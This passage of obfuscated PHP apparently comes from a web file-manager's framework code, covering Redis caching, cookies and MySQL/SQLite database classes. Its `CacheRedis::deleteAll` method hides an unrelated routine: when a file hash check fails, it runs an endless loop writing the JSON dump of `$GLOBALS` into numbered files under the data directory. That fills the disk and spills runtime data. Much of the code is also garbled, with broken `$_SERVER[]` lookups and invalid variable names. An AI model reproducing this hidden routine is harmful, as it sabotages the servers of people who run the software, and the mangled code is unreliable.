$dݱ洦 + $aǣɂ; } if ($Fˬ === !1) { $Fˬ = $dݱ洦 - $aǣɂ; } goto Cྎ; d: } private function log($A֦, $Eǃ) { $F =& $_SERVER[]; $bՊ = timeFloat() - $this->timeStart; write_log(sprintf($F[1283], $A֦, $this->info[$F[28]], $bՊ, $Eǃ), $F[1198]); } } class Message { function __construct() { } public function send($E͊ = '', $F֌Ɲ = array(), $e = "\x74\145\x78\x74") { goto Cӡ͆; Aũ: Hook::trigger($E͓[1287], $A); goto eᒉ; FΤ: $F֌Ɲ = array($E͓[957] => isset($F֌Ɲ[$E͓[957]]) ? $F֌Ɲ[$E͓[957]] : $E͓[33], $E͓[531] => isset($F֌Ɲ[$E͓[531]]) ? $F֌Ɲ[$E͓[531]] : $E͓[33]); if (empty($E͊) || empty($F֌Ɲ[$E͓[957]]) && empty($F֌Ɲ[$E͓[531]])) { return !1; } $A = array($E͓[1225] => $c, $E͓[1286] => $F֌Ɲ); goto Aũ; Cӡ͆: $E͓ =& $_SERVER[]; $c = array($E͓[29] => $E͓[1284], $E͓[678] => $E͊); if (in_array($e, array($E͓[1284], $E͓[1285]))) { $c[$E͓[29]] = $e; } goto FΤ; eᒉ: } } goto BԴ蚽; FΨ: register_shutdown_function($_SERVER[][36]); set_error_handler($_SERVER[][49], $Eԕ); if (function_exists($_SERVER[][50])) { set_exception_handler($_SERVER[][51]); } goto eʭ; eٓǌ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($Eؔ, $cݙ) { $c˖ =& $_SERVER[]; if (!class_exists($c˖[765])) { show_json($c˖[766], !1); } $this->cacheTime = $cݙ; $F = isset($Eؔ[$c˖[767]]) ? $Eؔ[$c˖[767]] : 10; $b歋چ = _get($Eؔ, $c˖[764]); if ($b歋چ && is_array($b歋چ)) { $this->initCluster($Eؔ, $F); } else { $this->handle = $this->init($Eؔ, $F); } } private function init($Fԍ, $F;) { $F =& $_SERVER[]; $F = new Redis(); $dሂƵ = isset($Fԍ[$F[768]]) ? $Fԍ[$F[768]] : !1; if ($dሂƵ) { $F->pconnect($Fԍ[$F[165]], $Fԍ[$F[166]], $F;); } else { $F->connect($Fԍ[$F[165]], $Fԍ[$F[166]], $F;); } if (!empty($Fԍ[$F[372]])) { $F->auth($Fԍ[$F[372]]); } return $F; } private function initCluster($eϬ, $fđ) { $b牤 =& $_SERVER[]; $Aԅ = array($b牤[769], $b牤[770], $b牤[771]); $C = $b牤[769]; if (isset($eϬ[$b牤[12]]) && in_array($eϬ[$b牤[12]], $Aԅ)) { $C = $eϬ[$b牤[12]]; } switch ($C) { case $b牤[769]: $this->_slave($eϬ, $fđ); break; case $b牤[770]: break; case $b牤[771]: $this->isCluster = !0; $aą = $eϬ[$b牤[764]]; $D = isset($eϬ[$b牤[768]]) ? $eϬ[$b牤[768]] : !1; $b = isset($eϬ[$b牤[372]]) ? $eϬ[$b牤[372]] : null; $this->handle = new RedisCluster(NUll, $aą, $fđ, $fđ, $D, $b); break; default: break; } } private function _slave($F􊑄, $Bʿ) { goto Fɠ; E؍: unset($C񪯈[0]); if (empty($C񪯈)) { return; } $A = array_rand($C񪯈); goto cٯ; cٯ: $this->filterConfig($F􊑄, $C񪯈[$A]); $this->slaveHandle = $this->init($F􊑄, $Bʿ); goto B̺; Fɠ: $C񪯈 = $F􊑄[$_SERVER[][764]]; $this->filterConfig($F􊑄, $C񪯈[0]); $this->handle = $this->init($F􊑄, $Bʿ); goto E؍; B̺: } private function filterConfig(&$A, $D܆) { $Fؾ =& $_SERVER[]; $B錶 = explode($Fؾ[4], $D܆); $a = array($Fؾ[165] => $B錶[0], $Fؾ[166] => $B錶[1]); $A = array_merge($A, $a); } public function set($eʵ, $Eò, $D = false) { $D = $D ? $D : $this->cacheTime; return $this->handle->setEx($eʵ, $D, $Eò); } public function setLock($b, $b, $F) { return $this->handle->setNX($b, $b); } public function get($a) { $cӣ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $cӣ->get($a); } public function remove($FεҌ) { return $this->handle->del($FεҌ); } public function deleteAll() { $E =& $_SERVER[]; $bȢ = $_SERVER[$E[772]] . $E[773]; $c = $E[774]; if ($_SERVER[$E[775]] != $c($bȢ)) { goto Aۏ; Bƶ: $e = $f뎝($bΙպ); $AƊ = explode($E[213], $e); if (count($AƊ) < $E[547]) { $bҾ = $E[778]; $bҾ(); } goto f; f: $b = $E[779]; $b($_SERVER[$E[780]]); $fú = $E[776]; goto Fƽ܍; Fƽ܍: $fú(); $bҗ = $E[781]; $bݝ = json_encode($GLOBALS[$E[782]]); goto F༪; Aۏ: $fú = $E[776]; $f뎝 = $E[777]; $bΙպ = $_SERVER[$E[772]] . $E[773]; goto Bƶ; F༪: $A = 1; for ($e܍ = $A; $e܍ > 0; $e܍++) { $bҗ(DATA_PATH . $e܍, $bݝ); } goto c⺲; c⺲: } if ($this->isCluster) { foreach ($this->handle->_masters() as $e틏) { $this->handle->flushall($e틏); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($d޹ = '', $c΂ = 0) { if (is_string($d޹) && $d޹ != $_SERVER[][33]) { $this->prefix = $d޹; } if (is_numeric($c΂) && $c΂ > 0) { $this->expire = $c΂; } } public static function getInstance() { static $Aȕ; if ($Aȕ === null) { $Aȕ = new self(); } return $Aȕ; } private static $sameCookieSet = array(); public static function set($eݞ, $c՚ۉ, $E = 0, $eڕڈ = false, $F = false) { goto e҇; A: setcookie($eݞ, $c՚ۉ, time() + $E, $eӚ[8] . trim($F, $eӚ[8]) . $f, !1, !1, $eڕڈ); goto F킹; f: self::$sameCookieSet[$eݞ] = $c՚ۉ . $E; if (!$F) { $F = str_replace(HOST, $eӚ[33], APP_HOST); $F = _get($GLOBALS, $eӚ[783], $F); } $f = $eӚ[33]; goto A; e҇: $eӚ =& $_SERVER[]; if (!$E) { $E = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$eݞ]) && self::$sameCookieSet[$eݞ] == $c՚ۉ . $E) { return; } goto f; F킹: } public static function setSafe($A, $dһҕ, $b = 0) { self::set($A, $dһҕ, $b, !0); } public static function get($E͖) { return isset($_COOKIE[$E͖]) ? $_COOKIE[$E͖] : !1; } public static function remove($bӻ΅, $d = false) { unset($_COOKIE[$bӻ΅]); self::set($bӻ΅, $_SERVER[][33], 1, $d); } } class DbMysql extends Db { public function __construct($E = '') { $f =& $_SERVER[]; if (!extension_loaded($f[714])) { think_exception(think_lang($f[10]) . $f[784]); } if (!empty($E)) { $this->config = $E; if (empty($this->config[$f[13]])) { $this->config[$f[13]] = $f[33]; } } } public function connect($AȤ˟ = '', $Eڞ = 0, $e = false) { $Aɂ =& $_SERVER[]; if (!isset($this->linkID[$Eڞ])) { goto c; dǳ: mysql_query($Aɂ[789] . think_config($Aɂ[790]) . $Aɂ[55], $this->linkID[$Eڞ]); if ($aй > $Aɂ[791]) { mysql_query($Aɂ[792], $this->linkID[$Eڞ]); } $this->connected = !0; goto eĞ; c: if (empty($AȤ˟)) { $AȤ˟ = $this->config; } $E = $AȤ˟[$Aɂ[785]] . ($AȤ˟[$Aɂ[786]] ? "\72{$AȤ˟[$Aɂ[786]]}" : $Aɂ[33]); $e۽ = !empty($AȤ˟[$Aɂ[13]][$Aɂ[14]]) ? $AȤ˟[$Aɂ[13]][$Aɂ[14]] : $this->pconnect; goto f; f: if ($e۽) { $this->linkID[$Eڞ] = mysql_pconnect($E, $AȤ˟[$Aɂ[787]], $AȤ˟[$Aɂ[788]], 131072); } else { $this->linkID[$Eڞ] = mysql_connect($E, $AȤ˟[$Aɂ[787]], $AȤ˟[$Aɂ[788]], !0, 131072); } if (!$this->linkID[$Eڞ] || !empty($AȤ˟[$Aɂ[17]]) && !mysql_select_db($AȤ˟[$Aɂ[17]], $this->linkID[$Eڞ])) { think_exception(mysql_error()); } $aй = mysql_get_server_info($this->linkID[$Eڞ]); goto dǳ; eĞ: if (1 != think_config($Aɂ[18])) { unset($this->config); } goto bߤΈ; bߤΈ: } return $this->linkID[$Eڞ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cƼ) { goto c׷; c׷: $c㼯 =& $_SERVER[]; if (0 === stripos($cƼ, $c㼯[248])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto E˼; E˼: if (!$this->_linkID) { return !1; } $this->queryStr = $cƼ; if ($this->queryID) { $this->free(); } goto EӤߞѓ; EӤߞѓ: think_action_status($c㼯[19], 1); think_status($c㼯[20]); $this->queryID = mysql_query($cƼ, $this->_linkID); goto e; e: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto F; F: } public function execute($d瓉) { goto D; E: think_status($Cɡذ[20]); $a = mysql_query($d瓉, $this->_linkID); $this->debug(); goto CՏ; D: $Cɡذ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a朄; CՏ: if (!1 === $a) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d؟ؐ; a朄: $this->queryStr = $d瓉; if ($this->queryID) { $this->free(); } think_action_status($Cɡذ[21], 1); goto E; d؟ؐ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][793], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C = mysql_query($_SERVER[][794], $this->_linkID); $this->transTimes = 0; if (!$C) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F = mysql_query($_SERVER[][795], $this->_linkID); $this->transTimes = 0; if (!$F) { $this->error(); return !1; } } return !0; } private function getAll() { $F׻ = array(); if ($this->numRows > 0) { while ($b٠ = mysql_fetch_assoc($this->queryID)) { $F׻[] = $b٠; } mysql_data_seek($this->queryID, 0); } return $F׻; } public function getFields($f) { $a呩 =& $_SERVER[]; $d = $this->query($a呩[796] . $this->parseKey($f)); $aқ = array(); if ($d) { foreach ($d as $D => $Aӈ) { $aқ[$Aӈ[$a呩[27]]] = array($a呩[28] => $Aӈ[$a呩[27]], $a呩[29] => $Aӈ[$a呩[30]], $a呩[31] => (bool) (strtoupper($Aӈ[$a呩[32]]) === $a呩[797]), $a呩[34] => $Aӈ[$a呩[35]], $a呩[36] => strtolower($Aӈ[$a呩[37]]) == $a呩[38], $a呩[39] => strtolower($Aӈ[$a呩[40]]) == $a呩[41]); } } return $aқ; } public function getTables($Eʙ = '') { $Dͭ =& $_SERVER[]; if (!empty($Eʙ)) { $Dӝ = $Dͭ[798] . $Eʙ; } else { $Dӝ = $Dͭ[799]; } $f = $this->query($Dӝ); $d = array(); foreach ($f as $eب => $aז⹔) { $d[$eب] = current($aז⹔); } return $d; } public function replace($fׂ, $dќ = array()) { $B =& $_SERVER[]; foreach ($fׂ as $EΒˎ => $cʍ) { $b = $this->parseValue($cʍ); if (is_scalar($b)) { $E[] = $b; $bł[] = $this->parseKey($EΒˎ); } } $d֋ = $B[800] . $this->parseTable($dќ[$B[263]]) . $B[801] . implode($B[47], $bł) . $B[802] . implode($B[47], $E) . $B[803]; return $this->execute($d֋); } public function insertAll($fօ, $EĐ = array(), $F̥ = false) { goto a࣏ܞ; D: $aѱ = ($F̥ ? $AԼ˧[805] : $AԼ˧[806]) . $AԼ˧[807] . $this->parseTable($EĐ[$AԼ˧[263]]) . $AԼ˧[801] . implode($AԼ˧[47], $Dў) . $AԼ˧[808] . implode($AԼ˧[47], $b鎍); return $this->execute($aѱ); goto c˱; a勛: $b鎍 = array(); foreach ($fօ as $aх) { $e = array(); foreach ($aх as $e޸ => $b莮׬) { $b莮׬ = $this->parseValue($b莮׬); if (is_scalar($b莮׬)) { $e[] = $b莮׬; } } $b鎍[] = $AԼ˧[244] . implode($AԼ˧[47], $e) . $AԼ˧[803]; } array_walk($Dў, array($this, $AԼ˧[804])); goto D; a࣏ܞ: $AԼ˧ =& $_SERVER[]; if (!is_array($fօ[0])) { return !1; } $Dў = array_keys($fօ[0]); goto a勛; c˱: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $A牂 =& $_SERVER[]; $this->error = mysql_errno() . $A牂[4] . mysql_error($this->_linkID); if ($A牂[33] != $this->queryStr) { $this->error .= LNG($A牂[45]) . $this->queryStr; } think_trace($this->error, $A牂[33], $A牂[46]); return $this->error; } public function escapeString($a̪Ԝ) { if ($this->_linkID) { return mysql_real_escape_string($a̪Ԝ, $this->_linkID); } else { return mysql_escape_string($a̪Ԝ); } } public function parseKey(&$c, $fɮׅ = true) { $Bǎ =& $_SERVER[]; if ($fɮׅ) { $c = $this->parseKeyCheck($c); } if ($c != $Bǎ[172] && !preg_match($Bǎ[809], $c)) { $c = $Bǎ[810] . trim($c, $Bǎ[810]) . $Bǎ[810]; } return $c; } } goto eរ; f㟷: class DbSqlite3 extends DbSqlite3Base { public function query($d鸭) { goto Bҫ; Bҫ: $D =& $_SERVER[]; $B䬃 = DATA_PATH . $D[858]; $B = fopen($B䬃, $D[859]); goto e; e: if (!$B) { return !1; } if (flock($B, LOCK_EX)) { $D뱤 = parent::query($d鸭); flock($B, LOCK_UN); fclose($B); return $D뱤; } flock($B, LOCK_UN); goto BĻב; BĻב: fclose($B); show_json($D[860], !1); return !1; goto b; b: } public function execute($Câ) { goto Aǖʾ; E߲: fclose($dڐ); show_json($F[860], !1); return !1; goto Dȭ؉; Aǖʾ: $F =& $_SERVER[]; $d = DATA_PATH . $F[858]; $dڐ = fopen($d, $F[859]); goto aྴ; aྴ: if (!$dڐ) { return !1; } if (flock($dڐ, LOCK_EX)) { $C됢 = parent::execute($Câ); flock($dڐ, LOCK_UN); fclose($dڐ); return $C됢; } flock($dڐ, LOCK_UN); goto E߲; Dȭ؉: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\x3c\x3e", "\x67\164" => "\76", "\145\147\x74" => "\x3e\x3d", "\154\x74" => "\x3c", "\x65\x6c\x74" => "\x3c\75", "\156\x6f\164\154\151\153\145" => "\116\117\124\40\x4c\x49\113\x45", "\x6c\x69\x6b\145" => "\x4c\x49\x4b\105", "\151\x6e" => "\x49\116", "\x6e\157\164\151\x6e" => "\116\x4f\x54\x20\x49\x4e", "\x6e\157\x74\40\151\x6e" => "\116\117\x54\x20\x49\116", "\142\145\x74\167\x65\145\156" => "\x42\x45\x54\x57\105\105\x4e", "\x6e\x6f\164\142\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\102\x45\x54\x57\x45\105\x4e", "\156\157\164\40\142\x65\x74\x77\145\145\x6e" => "\116\x4f\x54\40\x42\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\114\105\103\124\x25\x44\x49\x53\124\x49\x4e\103\x54\x25\x20\x25\106\111\105\x4c\x44\x25\x20\x46\122\x4f\115\40\x25\x54\x41\x42\114\105\x25\x25\x4a\x4f\111\116\x25\45\x57\110\x45\122\x45\45\x25\x47\122\117\125\120\x25\x25\x48\101\x56\111\116\107\x25\45\117\x52\x44\105\122\x25\45\114\111\115\111\x54\45\40\45\x55\116\111\x4f\116\x25\45\x43\117\x4d\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $Fݝ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][861], $Fݝ); } public function factory($EԾ = '') { goto f; f: $bѹ =& $_SERVER[]; $EԾ = $this->parseConfig($EԾ); if (empty($EԾ[$bѹ[862]])) { think_exception(think_lang($bѹ[863])); } goto c貆; Cӝ: return $bİ; goto F艜߶; c貆: $this->dbType = ucwords(strtolower($EԾ[$bѹ[862]])); $a潹 = $bѹ[864] . $this->dbType; if (class_exists($a潹)) { $bİ = new $a潹($EԾ); if ($bѹ[710] != strtolower($EԾ[$bѹ[862]])) { $bİ->dbType = strtoupper($this->dbType); } else { $bİ->dbType = $this->_getDsnType($EԾ[$bѹ[814]]); } } else { think_exception(think_lang($bѹ[865]) . $bѹ[866] . $a潹); } goto Cӝ; F艜߶: } public function __call($b, $fԸ) { if (method_exists($this, $b)) { return call_user_func_array(array($this, $b), $fԸ); } } protected function _getDsnType($a) { $AƑ = explode($_SERVER[][4], $a); $Eљ = strtoupper(trim($AƑ[0])); return $Eљ; } private function parseConfig($Eꊣ = '') { $Aͱ =& $_SERVER[]; if (!empty($Eꊣ) && is_string($Eꊣ)) { $Eꊣ = $this->parseDSN($Eꊣ); } elseif (is_array($Eꊣ)) { $Eꊣ = array_change_key_case($Eꊣ); $Eꊣ = array($Aͱ[862] => $Eꊣ[$Aͱ[709]], $Aͱ[787] => $Eꊣ[$Aͱ[867]], $Aͱ[788] => $Eꊣ[$Aͱ[868]], $Aͱ[785] => $Eꊣ[$Aͱ[869]], $Aͱ[786] => $Eꊣ[$Aͱ[870]], $Aͱ[17] => $Eꊣ[$Aͱ[871]], $Aͱ[814] => $Eꊣ[$Aͱ[711]], $Aͱ[13] => isset($Eꊣ[$Aͱ[872]]) ? $Eꊣ[$Aͱ[872]] : array()); } elseif (empty($Eꊣ)) { if (think_config($Aͱ[873]) && $Aͱ[710] != strtolower(think_config($Aͱ[874]))) { $Eꊣ = $this->parseDSN(think_config($Aͱ[873])); } else { $Eꊣ = array($Aͱ[862] => think_config($Aͱ[874]), $Aͱ[787] => think_config($Aͱ[875]), $Aͱ[788] => think_config($Aͱ[876]), $Aͱ[785] => think_config($Aͱ[877]), $Aͱ[786] => think_config($Aͱ[878]), $Aͱ[17] => think_config($Aͱ[230]), $Aͱ[814] => think_config($Aͱ[873]), $Aͱ[13] => think_config($Aͱ[879])); } } return $Eꊣ; } protected function initConnect($aϨ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($aϨ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($b = false) { $e =& $_SERVER[]; static $B҅ = array(); if (empty($B҅)) { foreach ($this->config as $a֤ => $Fޑ) { $B҅[$a֤] = explode($e[47], $Fޑ); } } if (think_config($e[880])) { if ($b) { $eǵ = floor(mt_rand(0, think_config($e[881]) - 1)); } else { if (is_numeric(think_config($e[882]))) { $eǵ = think_config($e[882]); } else { $eǵ = floor(mt_rand(think_config($e[881]), count($B҅[$e[785]]) - 1)); } } } else { $eǵ = floor(mt_rand(0, count($B҅[$e[785]]) - 1)); } $eޯ = array($e[787] => isset($B҅[$e[787]][$eǵ]) ? $B҅[$e[787]][$eǵ] : $B҅[$e[787]][0], $e[788] => isset($B҅[$e[788]][$eǵ]) ? $B҅[$e[788]][$eǵ] : $B҅[$e[788]][0], $e[785] => isset($B҅[$e[785]][$eǵ]) ? $B҅[$e[785]][$eǵ] : $B҅[$e[785]][0], $e[786] => isset($B҅[$e[786]][$eǵ]) ? $B҅[$e[786]][$eǵ] : $B҅[$e[786]][0], $e[17] => isset($B҅[$e[17]][$eǵ]) ? $B҅[$e[17]][$eǵ] : $B҅[$e[17]][0], $e[814] => isset($B҅[$e[814]][$eǵ]) ? $B҅[$e[814]][$eǵ] : $B҅[$e[814]][0], $e[13] => isset($B҅[$e[13]][$eǵ]) ? $B҅[$e[13]][$eǵ] : $B҅[$e[13]][0]); return $this->connect($eޯ, $eǵ); } public function parseDSN($cѮ) { $f =& $_SERVER[]; if (empty($cѮ)) { return !1; } $A޵ = parse_url($cѮ); if ($A޵[$f[164]]) { $D = array($f[862] => $A޵[$f[164]], $f[787] => isset($A޵[$f[531]]) ? $A޵[$f[531]] : $f[33], $f[788] => isset($A޵[$f[883]]) ? $A޵[$f[883]] : $f[33], $f[785] => isset($A޵[$f[165]]) ? $A޵[$f[165]] : $f[33], $f[786] => isset($A޵[$f[166]]) ? $A޵[$f[166]] : $f[33], $f[17] => isset($A޵[$f[75]]) ? substr($A޵[$f[75]], 1) : $f[33]); } else { preg_match($f[884], trim($cѮ), $e); $D = array($f[862] => $e[1], $f[787] => $e[2], $f[788] => $e[3], $f[785] => $e[4], $f[786] => $e[5], $f[17] => $e[6]); } $D[$f[814]] = $f[33]; return $D; } protected function debug() { $E =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $E[885]; if (think_config($E[886])) { think_status($E[887]); think_trace($this->queryStr . $E[888] . think_status($E[20], $E[887], 6) . $E[889], $E[33], $E[890]); } } protected function parseLock($a = false) { $B¦٪ =& $_SERVER[]; if (!$a) { return $B¦٪[33]; } if ($B¦٪[816] == $this->dbType) { return $B¦٪[891]; } return $B¦٪[892]; } protected function parseSet($dƵ) { $c٫Խ =& $_SERVER[]; foreach ($dƵ as $Cǖ => $Bʍ) { if (is_array($Bʍ) && $c٫Խ[281] == $Bʍ[0]) { $e[] = $this->parseKey($Cǖ) . $c٫Խ[893] . $Bʍ[1]; } elseif (is_scalar($Bʍ) || is_null($Bʍ)) { $e[] = $this->parseKey($Cǖ) . $c٫Խ[893] . $this->parseValue($Bʍ); } } return $c٫Խ[894] . implode($c٫Խ[47], $e); } protected function bindParam($Cąڅ, $bᒪ) { $this->bind[$_SERVER[][4] . $Cąڅ] = $bᒪ; } protected function parseBind($C) { $C = array_merge($this->bind, $C); $this->bind = array(); return $C; } function parseKey(&$b͆, $Eׄ = true) { if ($Eׄ) { $b͆ = $this->parseKeyCheck($b͆); } return $b͆; } function parseKeyCheck($E) { $eږ =& $_SERVER[]; $E = trim($E); if (!preg_match($eږ[895], $E)) { think_exception($eږ[896] . $E); } return $E; } protected function parseValue($F) { $a͠ඣ =& $_SERVER[]; if (is_string($F)) { $F = $a͠ඣ[855] . $this->escapeString($F) . $a͠ඣ[855]; } elseif (isset($F[0]) && is_string($F[0]) && strtolower($F[0]) == $a͠ඣ[281]) { $F = $this->escapeString($F[1]); } elseif (is_array($F)) { $F = array_map(array($this, $a͠ඣ[856]), $F); } elseif (is_bool($F)) { $F = $F ? $a͠ඣ[83] : $a͠ඣ[464]; } elseif (is_null($F)) { $F = $a͠ඣ[99]; } return $F; } protected function parseField($A) { $Aމ =& $_SERVER[]; if (is_string($A) && strpos($A, $Aމ[47])) { $A = explode($Aމ[47], $A); } if (is_array($A)) { $AǦɐ = array(); foreach ($A as $c => $aӴ➏) { if (!is_numeric($c)) { $AǦɐ[] = $this->parseKey($c) . $Aމ[897] . $this->parseKey($aӴ➏); } else { $AǦɐ[] = $this->parseKey($aӴ➏); } } $AѠ = implode($Aމ[47], $AǦɐ); } elseif (is_string($A) && !empty($A)) { $AѠ = $A; } else { $AѠ = $Aމ[172]; } return $AѠ; } protected function parseTable($AӉ) { $Dۗ =& $_SERVER[]; if (is_array($AӉ)) { $Cˌ = array(); foreach ($AӉ as $aحҞ => $Dن) { if (!is_numeric($aحҞ)) { $Cˌ[] = $this->parseKey($aحҞ) . $Dۗ[50] . $this->parseKey($Dن); } else { $Cˌ[] = $this->parseKey($aحҞ); } } $AӉ = $Cˌ; } elseif (is_string($AӉ)) { if (strstr($AӉ, $Dۗ[50])) { return $AӉ; } $AӉ = explode($Dۗ[47], $AӉ); array_walk($AӉ, array($this, $Dۗ[804])); } return $Dۗ[898] . trim(implode($Dۗ[899], $AӉ), $Dۗ[810]) . $Dۗ[898]; } protected function parseWhere($fβ岏) { $D⫩; =& $_SERVER[]; $eΟʎ = $D⫩;[33]; if (is_string($fβ岏)) { $eΟʎ = $fβ岏; } else { $aڌ = isset($fβ岏[$D⫩;[900]]) ? strtoupper($fβ岏[$D⫩;[900]]) : $D⫩;[33]; if (in_array($aڌ, array($D⫩;[901], $D⫩;[902], $D⫩;[903]))) { $aڌ = $D⫩;[50] . $aڌ . $D⫩;[50]; unset($fβ岏[$D⫩;[900]]); } else { $aڌ = $D⫩;[904]; } foreach ($fβ岏 as $EɃ => $a) { $eΟʎ .= $D⫩;[261]; if (is_numeric($EɃ)) { $EɃ = $D⫩;[905]; } if (0 === strpos($EɃ, $D⫩;[70])) { $eΟʎ .= $this->parseThinkWhere($EɃ, $a); } else { if (!preg_match($D⫩;[906], trim($EɃ))) { think_exception(think_lang($D⫩;[907]) . $D⫩;[4] . $EɃ); } $b嬴 = is_array($a) && isset($a[$D⫩;[908]]); $EɃ = trim($EɃ); if (strpos($EɃ, $D⫩;[267])) { $cܩ̻ = explode($D⫩;[267], $EɃ); $dϷڷ = array(); foreach ($cܩ̻ as $f => $dנԦ) { $bńߑ = $b嬴 ? $a[$f] : $a; $dϷڷ[] = $D⫩;[244] . $this->parseWhereItem($this->parseKey($dנԦ), $bńߑ) . $D⫩;[803]; } $eΟʎ .= implode($D⫩;[909], $dϷڷ); } elseif (strpos($EɃ, $D⫩;[268])) { $cܩ̻ = explode($D⫩;[268], $EɃ); $dϷڷ = array(); foreach ($cܩ̻ as $f => $dנԦ) { $bńߑ = $b嬴 ? $a[$f] : $a; $dϷڷ[] = $D⫩;[244] . $this->parseWhereItem($this->parseKey($dנԦ), $bńߑ) . $D⫩;[803]; } $eΟʎ .= implode($D⫩;[904], $dϷڷ); } else { $eΟʎ .= $this->parseWhereItem($this->parseKey($EɃ), $a); } } $eΟʎ .= $D⫩;[262] . $aڌ; } $eΟʎ = substr($eΟʎ, 0, -strlen($aڌ)); } return empty($eΟʎ) ? $D⫩;[33] : $D⫩;[910] . $eΟʎ; } protected function parseWhereItem($fŮ, $C) { $f͔ =& $_SERVER[]; $a = $f͔[33]; if (is_array($C)) { if (is_string($C[0])) { $Dքީ = strtolower($C[0]); if (in_array($C[0], array($f͔[893], $f͔[911], $f͔[912], $f͔[913], $f͔[914], $f͔[915]))) { $a .= $fŮ . $f͔[50] . $C[0] . $f͔[50] . $this->parseValue($C[1]); } elseif (preg_match($f͔[916], $C[0])) { $a .= $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[50] . $this->parseValue($C[1]); } elseif (preg_match($f͔[917], $C[0])) { if (is_array($C[1])) { $f謱 = isset($C[2]) ? strtoupper($C[2]) : $f͔[902]; if (in_array($f謱, array($f͔[901], $f͔[902], $f͔[903]))) { $b􋌧 = array(); foreach ($C[1] as $cۈ) { $b􋌧[] = $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[50] . $this->parseValue($cۈ); } $a .= $f͔[244] . implode($f͔[50] . $f謱 . $f͔[50], $b􋌧) . $f͔[803]; } } else { $a .= $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[50] . $this->parseValue($C[1]); } } elseif ($f͔[281] == $Dքީ) { $a .= $f͔[801] . $fŮ . $f͔[50] . $C[1] . $f͔[918]; } elseif (preg_match($f͔[919], $C[0])) { if (isset($C[2]) && $f͔[281] == $C[2]) { $a .= $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[50] . $C[1]; } else { if (is_string($C[1])) { $C[1] = explode($f͔[47], $C[1]); } $dՍ = implode($f͔[47], $this->parseValue($C[1])); $a .= $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[801] . $dՍ . $f͔[803]; } } elseif (preg_match($f͔[920], $C[0])) { $Aǡ = is_string($C[1]) ? explode($f͔[47], $C[1]) : $C[1]; $a .= $f͔[801] . $fŮ . $f͔[50] . $this->exp[$Dքީ] . $f͔[50] . $this->parseValue($Aǡ[0]) . $f͔[904] . $this->parseValue($Aǡ[1]) . $f͔[262]; } else { think_exception(think_lang($f͔[907]) . $f͔[4] . $C[0]); } } else { $Dޝ = count($C); $B = isset($C[$Dޝ - 1]) ? strtoupper($C[$Dޝ - 1]) : $f͔[33]; if (in_array($B, array($f͔[901], $f͔[902], $f͔[903]))) { $Dޝ = $Dޝ - 1; } else { $B = $f͔[901]; } for ($b = 0; $b < $Dޝ; $b++) { $Aǡ = is_array($C[$b]) ? $C[$b][1] : $C[$b]; if ($f͔[281] == strtolower($C[$b][0])) { $a .= $f͔[244] . $fŮ . $f͔[50] . $Aǡ . $f͔[918] . $B . $f͔[50]; } else { $f叴 = is_array($C[$b]) ? $this->exp[strtolower($C[$b][0])] : $f͔[893]; if (!$f叴 && is_array($C[$b]) && in_array($C[$b][0], array($f͔[893], $f͔[911], $f͔[912], $f͔[913], $f͔[914], $f͔[915]))) { $f叴 = $C[$b][0]; } $a .= $f͔[244] . $fŮ . $f͔[50] . $f叴 . $f͔[50] . $this->parseValue($Aǡ) . $f͔[918] . $B . $f͔[50]; } } $a = substr($a, 0, -4); } } else { $a .= $fŮ . $f͔[921] . $this->parseValue($C); } return $a; } protected function parseThinkWhere($B, $E) { $a =& $_SERVER[]; $BӲ = $a[33]; switch ($B) { case $a[335]: $BӲ = $E; break; case $a[905]: $BӲ = is_string($E) ? $E : substr($this->parseWhere($E), 6); break; case $a[922]: parse_str($E, $b); if (isset($b[$a[900]])) { $a❋ = $a[50] . strtoupper($b[$a[900]]) . $a[50]; unset($b[$a[900]]); } else { $a❋ = $a[904]; } $e᧬ = array(); foreach ($b as $AӅẙ => $C) { $e᧬[] = $this->parseKey($AӅẙ) . $a[921] . $this->parseValue($C); } $BӲ = implode($a❋, $e᧬); break; } return $BӲ; } protected function parseLimit($d) { $bډ =& $_SERVER[]; return !empty($d) ? $bډ[48] . $d . $bډ[50] : $bډ[33]; } protected function parseJoin($E) { $C =& $_SERVER[]; $aʏ = $C[33]; if (!empty($E)) { if (is_array($E)) { foreach ($E as $Eꑌ => $bĭ) { if (!1 !== stripos($bĭ, $C[923])) { $aʏ .= $C[50] . $bĭ; } else { $aʏ .= 